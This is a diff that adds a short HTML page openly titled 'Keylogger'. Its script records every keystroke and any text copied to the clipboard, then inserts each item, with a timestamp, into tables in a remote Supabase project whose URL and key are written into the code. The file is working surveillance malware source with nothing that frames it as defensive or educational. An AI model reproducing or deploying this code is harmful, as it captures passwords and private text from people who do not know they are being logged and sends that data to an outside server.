@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Keylogger</title>
+  <!-- Supabase SDK -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.20.0/dist/supabase.min.js"></script>
+</head>
+<body>
+  <h1>Keylogger is running...</h1>
+
+  <script>
+    // Initialize Supabase
+    const supabase = window.supabase.createClient(
+      'https://efjanywnqbtbdnxlspga.supabase.co', // Your Supabase URL
+      'sb_publishable_E0cGB_SOoW2EZj4JGlTF7A_b2zxZaOi' // Your Publishable Key
+    );
+
+    // Keylogger
+    document.addEventListener('keydown', (e) => {
+      const key = e.key;
+      sendToSupabase('keylogs', key);
+    });
+
+    // Clipboard
+    document.addEventListener('copy', (e) => {
+      const text = e.clipboardData ? e.clipboardData.getData('text') : '';
+      sendToSupabase('clipboard_logs', text);
+    });
+
+    function sendToSupabase(table, data) {
+      supabase.from(table)
+        .insert({
+          key: data,
+          timestamp: new Date().toISOString()
+        })
+        .catch(err => {
+          console.error('Supabase error:', err);
+        });
+    }
+  </script>
+</body>
+</html>
